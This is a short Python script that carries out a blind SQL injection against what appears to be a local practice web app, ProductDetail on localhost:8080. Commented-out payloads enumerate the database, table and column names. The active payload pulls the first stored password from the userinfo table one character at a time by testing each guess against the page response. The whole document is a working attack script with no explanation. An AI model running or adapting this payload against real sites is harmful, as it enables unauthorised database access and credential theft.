import requests

def test_character(position, character):
    #url = f"http://localhost:8080/WebSQLiBlind/ProductDetail?id=1' AND SUBSTRING((SELECT DATABASE()), {position}, 1) = '{character}' -- -"

    #url = f"http://localhost:8080/WebSQLiBlind/ProductDetail?id=1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbblindsql' LIMIT 1,1), {position}, 1) = '{character}' -- -"

    #url = f"http://localhost:8080/WebSQLiBlind/ProductDetail?id=1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'dbblindsql' AND table_name = 'userinfo' LIMIT 2,1), {position}, 1) = '{character}' -- -	"

    url = f"http://localhost:8080/WebSQLiBlind/ProductDetail?id=1' AND SUBSTRING((SELECT password FROM userinfo LIMIT 0,1), {position}, 1) = '{character}' -- -"

    response = requests.get(url)
    return "ID not found!!!" not in response.text

def Guess():
    database_name = ""
    position = 1

    while True:
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            if test_character(position, char):
                database_name += char
                position += 1
                break
        else:
            break  

    return database_name

guessed_database_name = Guess()
print("Guessed Name:", guessed_database_name)